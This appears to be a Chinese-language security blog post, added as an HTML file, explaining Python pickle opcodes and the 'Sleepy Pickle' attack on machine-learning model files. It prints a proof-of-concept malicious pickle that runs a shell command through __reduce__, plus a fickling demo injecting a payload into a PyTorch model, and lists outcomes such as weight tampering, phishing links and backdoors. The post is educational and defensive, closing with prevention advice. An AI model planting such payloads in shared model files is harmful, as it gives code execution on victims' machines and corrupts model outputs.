@@ -1,0 +1,358 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Sleepy Pickle · yunshiuan</title><meta name="description" content="Sleepy Pickle - yunshiuan"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/assets/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="/css/prism.css"><link rel="stylesheet" href="/css/prism-line-numbers.css"><link rel="search" type="application/opensearchdescription+xml" href="https://yunshiuan.com/atom.xml" title="yunshiuan"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="yunshiuan" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/assets/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/blog/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="https://github.com/YunshiuanOAO" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/assets/CV.pdf" target="_self" class="nav-list-link">CV</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Sleepy Pickle</h1><div class="post-info">Aug 14, 2025</div><div class="post-content"><h1 id="💤🥒Sleeply-Pickle"><a href="#💤🥒Sleeply-Pickle" class="headerlink" title="💤🥒Sleeply Pickle"></a>💤🥒Sleeply Pickle</h1><p>Demo code : <a target="_blank" rel="noopener" href="https://github.com/YunshiuanOAO/SleepyPickle-Demo">https://github.com/YunshiuanOAO/SleepyPickle-Demo</a></p>
+<p>Slido : <a target="_blank" rel="noopener" href="https://speakerdeck.com/yunshiuanoao/sleeplypickle">https://speakerdeck.com/yunshiuanoao/sleeplypickle</a></p>
+<h2 id="♻️序列化-Serialization-反序列化-Deserialization"><a href="#♻️序列化-Serialization-反序列化-Deserialization" class="headerlink" title="♻️序列化(Serialization)&#x2F;反序列化(Deserialization)"></a>♻️序列化(Serialization)&#x2F;反序列化(Deserialization)</h2><p>序列化是將一個資料結構或物件轉換成一種可以儲存或交換的格式（如位元組流、JSON、XML 等）。這樣的轉換讓物件能夠寫入檔案、透過網路傳輸，或儲存在資料庫中。</p>
+<p>反序列化則是將儲存的數據或接收到的數據轉換回原始的物件或資料結構。</p>
+<p><img src="/./assets/picklePic.png" alt="alt text"></p>
+<hr>
+<h2 id="🥒-What-is-Pickle"><a href="#🥒-What-is-Pickle" class="headerlink" title="🥒 What is Pickle?"></a>🥒 What is Pickle?</h2><p>Pickle 是 Python 的內建模組，提供了將 Python 物件序列化和反序列化的功能。</p>
+<p>常見用途</p>
+<dl><dt>:    將物件儲存到檔案中，方便之後載入。<br>:    將物件透過網路或其他通道進行傳輸。</dt><dd><strong>快速儲存和載入機器學習模型、配置檔或計算結果</strong>。</dd></dl><p>支援的物件類型</p>
+<dl><dt>:    Pickle 支援多種 Python 內建的資料型態，包括：<br>:    ✔️ 數字（int, float）<br>:    ✔️ 字串（str）<br>:    ✔️ 列表（list）、元組（tuple）、字典（dict）、集合（set）<br>:    ✔️ 自訂類別物件</dt><dd>✔️ 函數</dd></dl><p>Example : </p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">import pickle
+import pickletools
+
+
+data &#x3D; &#123;&quot;name&quot;: &quot;Alice&quot;, &quot;age&quot;: 30, &quot;scores&quot;: [88, 92, 95]&#125;
+
+with open(&quot;data.pkl&quot;, &quot;wb&quot;) as file:
+    pickle.dump(data, file, protocol&#x3D;0)
+    print(&quot;Data has been successfully serialized to data.pkl&quot;)
+
+with open(&quot;data.pkl&quot;, &quot;rb&quot;) as file:
+    unpickled_data &#x3D; pickle.load(file)
+    print(unpickled_data)
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Output: </p>
+<pre class="line-numbers language-none"><code class="language-none">Data has been successfully serialized to data.pkl
+&#123;&#39;name&#39;: &#39;Alice&#39;, &#39;age&#39;: 30, &#39;scores&#39;: [88, 92, 95]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>可以使用pickletools將pickle執行的內容dump出來</p>
+<pre class="line-numbers language-none"><code class="language-none">    0: (    MARK
+    1: d        DICT       (MARK at 0)
+    2: p    PUT        0
+    5: V    UNICODE    &#39;name&#39;
+   11: p    PUT        1
+   14: V    UNICODE    &#39;Alice&#39;
+   21: p    PUT        2
+   24: s    SETITEM
+   25: V    UNICODE    &#39;age&#39;
+   30: p    PUT        3
+   33: I    INT        30
+   37: s    SETITEM
+   38: V    UNICODE    &#39;scores&#39;
+   46: p    PUT        4
+   49: (    MARK
+   50: l        LIST       (MARK at 49)
+   51: p    PUT        5
+   54: I    INT        88
+   58: a    APPEND
+   59: I    INT        92
+   63: a    APPEND
+   64: I    INT        95
+   68: a    APPEND
+   69: s    SETITEM
+   70: .    STOP
+highest protocol among opcodes &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>由上面的資訊可以得知，其實Pickle在反序列化的過成就很像一個簡易的堆疊虛擬機在執行，透過Opcode並且在Pickle Virtual Machine執行<br>主要由這三個</p>
+<ul>
+<li><p>指令處理器 (Instruction Processor)</p>
+<p>  從指令流 (byte stream) 中讀取 opcode 與參數，並依序進行解譯與處理。</p>
+<p>  不斷重複「讀取 -&gt; 處理」的流程，直到遇到結束符號（通常是 .）後停止。</p>
+<p>  反序列化結束時，最終留在 stack 頂端的值將作為反序列化結果返回。</p>
+</li>
+<li><p>Stack (堆疊)</p>
+<p>  由 Python 的 list 實作。</p>
+<p>  用於暫時儲存資料、參數以及各種物件。</p>
+<p>  各種 opcode 會操作此堆疊（如推入、彈出、組合容器等）。</p>
+</li>
+<li><p>Memo (備忘錄)</p>
+<p>  由 Python 的 dict 實作。</p>
+<p>  在 PVM 整個生命週期中，負責儲存先前出現過的物件，以便重複引用或避免重複建立。</p>
+<p>  透過索引或序號 (index) 來存取對應物件。</p>
+</li>
+</ul>
+<p>以下為常用的opcode </p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>指令</strong></th>
+<th align="left"><strong>描述</strong></th>
+<th align="left"><strong>具體寫法</strong></th>
+<th align="left"><strong>對 stack 的變化</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>c</strong></td>
+<td align="left">取得一個全局物件或 import 一個模組</td>
+<td align="left"><code>c[module]\n[instance]\n</code></td>
+<td align="left">取得的物件入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>o</strong></td>
+<td align="left">尋找 stack 中的上一個 MARK，以之間的第一個資料（必須為函數）為 callable，第二個到第 n 個資料為參數，執行該函數（或實例化一個物件）</td>
+<td align="left"><code>o</code></td>
+<td align="left">這個過程中涉及到的資料都出 stack，函數的返回值（或生成的物件）入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>i</strong></td>
+<td align="left">相當於 c 和 o 的組合，先取得一個全局函數，然後尋找 stack 中的上一個 MARK，並組合之間的資料為元組，再以該元組為參數執行全局函數（或實例化一個物件）</td>
+<td align="left"><code>i[module]\n[callable]\n</code></td>
+<td align="left">這個過程中涉及到的資料都出 stack，函數返回值（或生成的物件）入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>N</strong></td>
+<td align="left">實例化一個 None</td>
+<td align="left"><code>N</code></td>
+<td align="left">取得的 None 對象入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>S</strong></td>
+<td align="left">實例化一個字串對象</td>
+<td align="left"><code>S&#39;xxx&#39;\n</code><br>也可使用雙引號或 <code>\&#39;</code> 等 Python 字串形式</td>
+<td align="left">取得的字串對象入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>V</strong></td>
+<td align="left">實例化一個 Unicode 字串對象</td>
+<td align="left"><code>Vxxx\n</code></td>
+<td align="left">取得的字串對象入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>I</strong></td>
+<td align="left">實例化一個 int 對象</td>
+<td align="left"><code>Ixxx\n</code></td>
+<td align="left">取得的整數對象入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>F</strong></td>
+<td align="left">實例化一個 float 對象</td>
+<td align="left"><code>Fx.x\n</code></td>
+<td align="left">取得的浮點數對象入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>R</strong></td>
+<td align="left">選擇 stack 上的第一個對象作為函數、第二個對象作為參數（第二個對象必須為元組），然後呼叫該函數</td>
+<td align="left"><code>R</code></td>
+<td align="left">函數和參數出 stack，函數的返回值入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>.</strong></td>
+<td align="left">程式結束，stack 頂的單一元素作為 <code>pickle.loads()</code> 的返回值</td>
+<td align="left"><code>.</code></td>
+<td align="left">無</td>
+</tr>
+<tr>
+<td align="center"><strong>(</strong></td>
+<td align="left">向 stack 中壓入一個 MARK 標記</td>
+<td align="left"><code>(</code></td>
+<td align="left">MARK 標記入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>t</strong></td>
+<td align="left">尋找 stack 中的上一個 MARK，並組合之間的資料為元組</td>
+<td align="left"><code>t</code></td>
+<td align="left">MARK 標記以及被組合的資料出 stack，生成的元組入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>)</strong></td>
+<td align="left">向 stack 中直接壓入一個空元組</td>
+<td align="left"><code>)</code></td>
+<td align="left">空元組入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>l</strong></td>
+<td align="left">尋找 stack 中的上一個 MARK，並組合之間的資料為列表</td>
+<td align="left"><code>l</code></td>
+<td align="left">MARK 標記以及被組合的資料出 stack，生成的列表入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>]</strong></td>
+<td align="left">向 stack 中直接壓入一個空列表</td>
+<td align="left"><code>]</code></td>
+<td align="left">空列表入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>d</strong></td>
+<td align="left">尋找 stack 中的上一個 MARK，並組合之間的資料為字典（資料必須有偶數個，即呈 key-value 對）</td>
+<td align="left"><code>d</code></td>
+<td align="left">MARK 標記以及被組合的資料出 stack，生成的字典入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>}</strong></td>
+<td align="left">向 stack 中直接壓入一個空字典</td>
+<td align="left"><code>&#125;</code></td>
+<td align="left">空字典入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>p</strong></td>
+<td align="left">將 stack 頂對象儲存至 memo_n</td>
+<td align="left"><code>pn\n</code></td>
+<td align="left">無</td>
+</tr>
+<tr>
+<td align="center"><strong>g</strong></td>
+<td align="left">將 memo_n 的對象壓入 stack</td>
+<td align="left"><code>gn\n</code></td>
+<td align="left">將指定索引的 memo 對象入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>0</strong></td>
+<td align="left">丟棄 stack 頂對象</td>
+<td align="left"><code>0</code></td>
+<td align="left">stack 頂對象被丟棄</td>
+</tr>
+<tr>
+<td align="center"><strong>b</strong></td>
+<td align="left">使用 stack 中的第一個元素（儲存多個屬性名: 屬性值的字典）對第二個元素（對象實例）進行屬性設置</td>
+<td align="left"><code>b</code></td>
+<td align="left">stack 上第一個元素出 stack；第二個元素（對象）被更新</td>
+</tr>
+<tr>
+<td align="center"><strong>s</strong></td>
+<td align="left">將 stack 的第一個和第二個對象作為 key-value 對，添加或更新到 stack 的第三個對象（必須為列表或字典，列表以數字作為 key）</td>
+<td align="left"><code>s</code></td>
+<td align="left">第一、二個元素出 stack，第三個元素（列表或字典）被更新</td>
+</tr>
+<tr>
+<td align="center"><strong>u</strong></td>
+<td align="left">尋找 stack 中的上一個 MARK，組合之間的資料（必須有偶數個，即 key-value 對）並全部添加或更新到該 MARK 之前的一個對象（必須為字典）</td>
+<td align="left"><code>u</code></td>
+<td align="left">MARK 標記以及被組合的資料出 stack，字典被更新</td>
+</tr>
+<tr>
+<td align="center"><strong>a</strong></td>
+<td align="left">將 stack 的第一個元素 append 到第二個元素（列表）中</td>
+<td align="left"><code>a</code></td>
+<td align="left">stack 頂元素出 stack，第二個元素（列表）被更新</td>
+</tr>
+<tr>
+<td align="center"><strong>e</strong></td>
+<td align="left">尋找 stack 中的上一個 MARK，組合之間的資料並 extends 到該 MARK 之前的一個元素（必須為列表）</td>
+<td align="left"><code>e</code></td>
+<td align="left">MARK 標記以及被組合的資料出 stack，列表被更新</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="⚠️What’s-Wrong-with-Pickle"><a href="#⚠️What’s-Wrong-with-Pickle" class="headerlink" title="⚠️What’s Wrong with Pickle ?"></a>⚠️What’s Wrong with Pickle ?</h2><p>Pickle文檔上有出現這一個警告<br><img src="/./assets/image.png" alt="alt text"></p>
+<p>Pickle當中有一個 <code>__reduce__</code> 可以使用，當反序列化時會自動呼叫</p>
+<p>以下範例為製作一個惡意的pickle</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">
+import pickle
+import subprocess
+
+class EvilPickle:
+    def __reduce__(self):
+        return (subprocess.Popen, ((&#39;ls&#39;,),))
+e &#x3D;  EvilPickle()
+with open(&#39;evil.pkl&#39;, &#39;wb&#39;) as f:
+    pickle.dump(e, f)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用pickletool 把惡意pickle檔dump出來看看</p>
+<pre class="line-numbers language-none"><code class="language-none">    0: c    GLOBAL     &#39;commands Popen&#39;
+   16: p    PUT        0
+   19: (    MARK
+   20: (        MARK
+   21: V            UNICODE    &#39;ls&#39;
+   25: p            PUT        1
+   28: t            TUPLE      (MARK at 20)
+   29: p        PUT        2
+   32: t        TUPLE      (MARK at 19)
+   33: p    PUT        3
+   36: R    REDUCE
+   37: p    PUT        4
+   40: .    STOP
+highest protocol among opcodes &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>執行結果：<br><img src="/./assets/reduce_RCE.png" alt="alt text"></p>
+<p>即可執行<code>ls</code>指令</p>
+<hr>
+<h2 id="💤Sleepy-Pickle"><a href="#💤Sleepy-Pickle" class="headerlink" title="💤Sleepy Pickle"></a>💤Sleepy Pickle</h2><p>利用pickle不安全的特性，將惡意的Bytecode植入使用pickle的模型檔案內。</p>
+<p><img src="/./assets/image-2.png" alt="alt text"><br>有一個針對此攻擊而產生的工具：<a target="_blank" rel="noopener" href="https://github.com/trailofbits/fickling">fickling</a></p>
+<p>此工具可以輕易的將想要執行的程式轉成bytecode值入進pickle中，另外也有檢測pickele內的惡意行為功能</p>
+<p>demo:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">import torch
+import torchvision.models as models
+import warnings
+from fickling.pytorch import PyTorchModelWrapper
+warnings.filterwarnings(&quot;ignore&quot;)
+
+model &#x3D; models.mobilenet_v2()
+torch.save(model, &quot;mobilenet.pth&quot;)
+
+result &#x3D; PyTorchModelWrapper(&quot;mobilenet.pth&quot;)
+
+temp_filename &#x3D; &quot;temp_filename.pt&quot;
+result.inject_payload(
+    &quot;print(&#39;Inject successful!&#39;)&quot;,
+    temp_filename,
+    injection&#x3D;&quot;insertion&quot;,
+    overwrite&#x3D;True,
+)
+
+# Load file with injected payload
+torch.load(&quot;mobilenet.pth&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>輸出：</p>
+<p><img src="/./assets/image-1.png" alt="alt text"></p>
+<p>在 Hugging face 上在目前常出現的是<code>pytorch_model.bin</code><br><img src="/./assets/image-3.png" alt="alt text"></p>
+<p>pytorch_model.bin是使用PyTorch中的torch.save 函數所生成的二進位檔案，裡面會存 weights, biases, 或者其他parameters，如果將它unzip會有一個data.pkl可以利用(會依照Pytorch不同的版本裡面會包含不同的檔案)</p>
+<p>!!! info</p>
+<pre><code>* PyTorch v0.1.1: Tar file with sys_info, pickle, storages, and tensors
+* PyTorch v0.1.10: Stacked pickle files
+* TorchScript v1.0: ZIP file with model.json
+* TorchScript v1.1: ZIP file with model.json and attributes.pkl
+* TorchScript v1.3: ZIP file with data.pkl and constants.pkl
+* TorchScript v1.4: ZIP file with data.pkl, constants.pkl, and version set at 2 or higher (2 pickle files and a folder)
+* PyTorch v1.3: ZIP file containing data.pkl (1 pickle file)
+* PyTorch model archive format[ZIP]: ZIP file that includes Python code files and pickle files
+</code></pre>
+<p><img src="/./assets/image-4.png" alt="alt text"></p>
+<p>!!! warning “PyTorch適用版本”<br>    PyTorch &lt;2.6 在最新 2.6版本中，Pytorch 將 torch.load 的參數weights_only預設為True</p>
+<pre><code>&gt; Also in this release as an important security improvement measure we have changed the default value for weights_only parameter of torch.load. This is a backward compatibility-breaking change, please see this forum post for more details.
+</code></pre>
+<p>接下來Hacker 會先透過中間人攻擊、供應鏈攻擊、社交工程等手法，將惡意Pickle檔案傳送至受害者的系統，一旦反序列化後有可能會進行以下的惡意攻擊</p>
+<ul>
+<li>修改模型參數</li>
+</ul>
+<p>可以去微調模型的參數讓他輸出出誤導性或有惡意的輸出</p>
+<p>如：<a target="_blank" rel="noopener" href="https://rome.baulab.info/">ROME</a></p>
+<p><img src="/./assets/image6.png" alt="alt text"></p>
+<ul>
+<li>釣魚</li>
+</ul>
+<p>可以在每次問答時插入惡意的連結<br><img src="/./assets/image-5.png" alt="alt text"></p>
+<ul>
+<li>埋後門</li>
+<li>XSS</li>
+<li>竊取使用者資料</li>
+<li>竄改資料</li>
+<li>…</li>
+</ul>
+<hr>
+<h2 id="🦾How-To-Prevent"><a href="#🦾How-To-Prevent" class="headerlink" title="🦾How To Prevent"></a>🦾How To Prevent</h2><ul>
+<li>不要使用Pickle，使用 SafeTensors.</li>
+<li>如果一定要使用Pickle，需要使用fickling對pickle進行掃描或者限制unpickler</li>
+</ul>
+<hr>
+<h2 id="📚Reference"><a href="#📚Reference" class="headerlink" title="📚Reference"></a>📚Reference</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/">Exploiting ML models with pickle file attacks: Part 1</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-2/">Exploiting ML models with pickle file attacks: Part 2</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/">Never a dill moment: Exploiting machine learning pickle files</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://thesisapi.lib.nycu.edu.tw/server/api/core/bitstreams/affc3d4c-9f19-429a-b392-ce8420d7351b/content">Pain Pickle: 繞過 Python 中受限制的 Unpickler 之自動化脅迫生成</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.ithome.com.tw/news/163545">研究人員揭露針對機器學習模型而來的攻擊手法Sleepy Pickle</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">Pickle反序列化</a></p>
+</li>
+</ul>
+</div></article></div></main><footer><div class="paginator"><a href="/2025/08/14/IPAS%E8%B3%87%E5%AE%89%E5%B7%A5%E7%A8%8B%E5%B8%AB/" class="prev">PREV</a><a href="/2025/08/12/BlueTeamCheatSheet/" class="next">NEXT</a></div><div class="copyright"><p>© 2025 - 2026 <a href="https://yunshiuan.com">yunshiuan</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-core.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-clike.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-cpp.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-javascript.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-json.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-markdown.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-markup.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-css.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script><script>Prism.plugins.autoloader.languages_path = 'https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/';
+</script><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>
